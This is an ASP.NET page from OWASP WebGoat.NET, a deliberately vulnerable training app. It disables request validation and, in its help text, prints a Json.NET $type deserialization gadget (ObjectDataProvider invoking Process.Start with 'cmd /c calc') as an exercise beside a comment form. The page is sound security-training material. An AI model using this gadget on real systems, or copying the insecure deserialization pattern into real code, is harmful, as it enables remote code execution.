<%@ Page Language="C#" validateRequest="false" AutoEventWireup="true" CodeBehind="JsonConvertor.aspx.cs" Inherits="OWASP.WebGoat.NET.JsonConvertor" MasterPageFile="~/Resources/Master-Pages/Site.Master" %>

<asp:Content ID="Content3" ContentPlaceHolderID="HelpContentPlaceholder" runat="server">
    This webpage fails to properly validate and encode user-supplied data.  Users can add their own JSON and run RCE attack.  
    See if you can run Calculator by usinf the following JSON.<br />
   <code> {
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values": [ "cmd", "/c calc" ]
    },
    "ObjectInstance": { "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" }
       </code>
}
</asp:Content>

<asp:Content ID="Content2" ContentPlaceHolderID="BodyContentPlaceholder" runat="server">
	
    
<script language="javascript" type="text/javascript">
    $(document).ready(function () {
        $("div.success").hide();
        setTimeout(function () {
            $("div.success").fadeIn("slow", function () {
                $("div.success").show();
            });
        }, 500);
    });
 </script>

    <h1 class="title-regular-4 clearfix">We'd love to hear from you!</h1>
    
    Service is always #1 to us, and we would love to hear your feedback.  Simply fill out the comment form below and tell us what you think!  Please no spam / trolling, and keep it respectful.  
    <p />
    We will answer your questions in the order they were received.  Thank you.
    
    <p />
    
    <asp:Label ID="lblOutput" runat="server" Text=""></asp:Label>

    <asp:Label ID="lblMessage" runat="server">
    <div class="success">
    JSON Successfully parsed!
    </div>
    </asp:Label>
        
    <asp:Label ID="lblComments" runat="server"></asp:Label>

    <h2 class='title-regular-2'>Leave a Comment</h2>
     
    <p>
        <asp:Table ID="Table1" runat="server" Width="100%">
            
          
            <asp:TableRow ID="TableRow2" runat="server">
                <asp:TableCell ID="TableCell3" runat="server" Width="10%" VerticalAlign="Top" style="vertical-align:middle">
                    Comment:
                </asp:TableCell>
                <asp:TableCell ID="TableCell4" runat="server">
                    <asp:TextBox ID="txtComment" runat="server" width="100%" Rows="5" TextMode="MultiLine" CssClass="text">
                    </asp:TextBox>
                </asp:TableCell>
            </asp:TableRow>
            
            <asp:TableRow ID="TableRow3" runat="server">
                <asp:TableCell ID="TableCell5" runat="server">&nbsp;</asp:TableCell>
                <asp:TableCell ID="TableCell6" runat="server">
                    <asp:Button ID="btnSave" runat="server" Text="Save Comment" onclick="btnSave_Click" />
                </asp:TableCell>
            </asp:TableRow>

        </asp:Table>
    </p>
    
</asp:Content>